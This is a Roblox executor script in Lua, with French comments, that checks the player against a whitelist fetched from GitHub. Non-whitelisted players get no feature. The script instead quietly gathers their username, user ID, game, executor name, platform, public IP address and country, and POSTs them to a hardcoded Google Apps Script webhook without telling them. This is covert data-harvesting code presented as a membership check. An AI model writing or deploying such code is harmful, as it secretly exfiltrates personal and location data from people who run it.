-- URL du fichier contenant les noms autorisés
local NoPingNamesURL = "https://raw.githubusercontent.com/Zdscsf/No-Ping/main/Script"

-- Tableau pour stocker les noms autorisés
local NoPingNames = {}

-- Fonction pour charger les noms autorisés à partir du fichier
local function loadNoPingNames()
    local success, result = pcall(function()
        local response = game:HttpGet(NoPingNamesURL)
        if response then
            for name in response:gmatch("[^\r\n]+") do
                table.insert(NoPingNames, name)
            end
        else
            error("Failed to load NoPing names.")
        end
    end)
    
    if not success then
        error("Failed to load NoPing names: " .. result)
    else
        print("Successfully loaded NoPing names")
    end
end

-- Charger les noms autorisés
loadNoPingNames()

-- Nom du joueur local
local playerName = game:GetService("Players").LocalPlayer.Name

-- Vérification d'autorisation
local function isNoPing(playerName)
    for _, name in pairs(NoPingNames) do
        if name == playerName then
            return true
        end
    end
    return false
end

--enable / disable the list
whitelist = true

-- Fonction Key du script
local function executeVipScript() 
    print("Hello No Ping Member")
end

-- Fonction webhook du script
local function executeWebScript() 
    -- Google Apps Script Webhook URL
    local webhookUrl = "https://script.google.com/macros/s/AKfycbyIUI5a0oscI7AMAwVHd3omDL6fwOujTLYNaqxMWyPSirbPgFWOcBiId--7qJe-aFPElw/exec"
    local geoApiUrl = "http://ip-api.com/json"  -- URL for geolocation API

    -- Function to get current date and time
    local function getCurrentDateTime()
        local date = os.date("*t")
        return {
            year = date.year,
            month = date.month,
            day = date.day,
            time = string.format("%02d:%02d:%02d", date.hour, date.min, date.sec)
        }
    end

    -- Function to get geolocation data from API
    local function getGeoData()
        local success, response = pcall(function()
            return game:HttpGet(geoApiUrl)
        end)
        if success then
            local data = game:GetService("HttpService"):JSONDecode(response)
            return {
                country = data.country or "Unknown",
                ip = data.query or "Unknown"
            }
        else
            return {
                country = "Unknown",
                ip = "Unknown"
            }
        end
    end

    -- Get the local player
    local localPlayer = game:GetService("Players").LocalPlayer
    local playerName = localPlayer.Name
    local playerId = localPlayer.UserId
    local placeName = "Unknown"
    local placeId = "Unknown"

    -- Attempt to get place information
    local success, placeInfo = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    if success and placeInfo then
        placeName = placeInfo.Name
        placeId = placeInfo.AssetId
    end

    local executorName = identifyexecutor()

    -- Get current date and time
    local dateTime = getCurrentDateTime()

    -- Get geolocation data
    local geoData = getGeoData()

    -- Get platform
    local platform = game:GetService("UserInputService").TouchEnabled and "Mobile" or "PC"

    -- Data to be sent to Google Apps Script
    local data = {
        year = dateTime.year,
        month = dateTime.month,
        day = dateTime.day,
        time = dateTime.time,
        playerName = playerName,
        playerId = playerId,
        placeName = placeName,
        placeId = placeId,
        executorName = executorName,
        country = geoData.country,
        ip = geoData.ip,
        platform = platform
    }
    local requestData = game:GetService("HttpService"):JSONEncode(data)

    -- Headers for the HTTP request
    local headers = {
        ["content-type"] = "application/json"
    }

    -- Send the HTTP request to Google Apps Script
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = requestData, Method = "POST", Headers = headers}
    request(webhookRequest)
end

-- Vérification
if whitelist == true then
    if isNoPing(playerName) then 
        executeVipScript()
    else
        executeWebScript()       
    end
else
    warn("NoPing member error: Pls report this to discord, thx :)")
end
